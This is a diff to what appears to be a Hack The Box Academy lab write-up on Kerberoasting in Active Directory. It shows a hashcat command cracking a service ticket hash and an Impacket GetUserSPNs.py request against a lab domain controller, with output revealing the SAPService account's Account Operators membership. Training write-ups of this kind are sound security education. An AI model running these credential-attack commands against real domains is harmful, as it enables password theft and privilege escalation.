@@ -598,7 +598,22 @@ hashcat -m 13100 SAPService_tgs /usr/share/wordlists/rockyou.txt
 
 [![Screenshot-2025-03-18-111408.png](https://i.postimg.cc/nc7LGWF3/Screenshot-2025-03-18-111408.png)](https://postimg.cc/w7qH60sN)
 
-<snip>
+
+
+
+* **What powerful local group on the Domain Controller is the SAPService user a member of?**
+
+We got the answer to this question when I first ran GetUserSPNs.py:
+
+```c
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/wley -request-user SAPService
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                  Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation 
+------------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------
+SAPService/srv01.inlanefreight.local  SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL  2022-04-18 14:40:02.959792  <never>               
 
 ```
 
